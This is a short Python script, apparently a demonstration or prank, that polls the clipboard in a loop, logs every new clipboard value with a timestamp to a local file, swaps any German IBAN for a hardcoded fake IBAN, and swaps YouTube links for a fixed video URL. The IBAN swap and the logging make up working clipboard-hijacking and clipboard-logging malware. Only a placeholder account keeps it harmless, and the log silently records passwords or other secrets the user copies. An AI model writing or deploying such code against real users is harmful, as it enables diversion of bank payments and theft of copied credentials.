import pyperclip, re , datetime
from spellchecker import SpellChecker

def log(logfile,log_data):
    time = datetime.datetime.now()
    with open(logfile,"a") as file:
        file.write(f"{time.strftime(f'%d/%m/%Y-%H:%M:%S')}  {log_data}\n")

def mod_iban():
    fake_iban = "DE12345678901234567890"    # Fake IBAN
    pyperclip.copy(fake_iban)

def mod_url():
    fake_url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"    # Youtube-URL
    pyperclip.copy(fake_url)

# Funktioniert nicht einwandfrei
# def spellcorrect(sentence):
#     correct_sentence = []
#     clipboard_sentence = sentence.split()
#     for word in clipboard_sentence:

#         correct_word = german.correction(word)
#         if correct_word == None:
#             correct_word = word

#         correct_sentence.append(correct_word)

#     correct_sentence = " ".join(correct_sentence)
#     pyperclip.copy(correct_sentence)
#     return correct_sentence

# german = SpellChecker(language="de")

if __name__ == "__main__":
    pyperclip.copy("")
    logfile = "clipboard_logfile.txt"
    clipboard = pyperclip.paste()

    print("Während das Programm läuft wird jede Youtube-URL in ihrem Clipboard durch eine bestimmte URL \nund jede IBAN durch eine fake IBAN ersetzt.")
    print(f"Ihr Clipboard-Log wird nach Beenden dieses Programms in {logfile} gespeichert.")
    

    while True:
        	
        # Clipboard update
        clipboard_data = pyperclip.paste()
        clipboard_data_list = clipboard_data.split()

        # Clipboard logging in clipboard_logfile.txt
        if clipboard != clipboard_data:
            log(logfile,clipboard_data)
            clipboard = clipboard_data
        else:
            clipboard_data = pyperclip.paste()

        # IBAN erstzen mit fake IBAN
        if re.match(r"DE[\d]{20}",clipboard_data):
            mod_iban()
        
        # Youtube-URL ersetzen mit bestimmter Youtube-URL
        elif "www.youtube.com" in clipboard_data:
            mod_url()

        # Autokorrektur
        # elif clipboard_data != None and german.unknown(clipboard_data_list):
        #     spellcorrect(clipboard_data)
        
        # above code doesn't work consistently


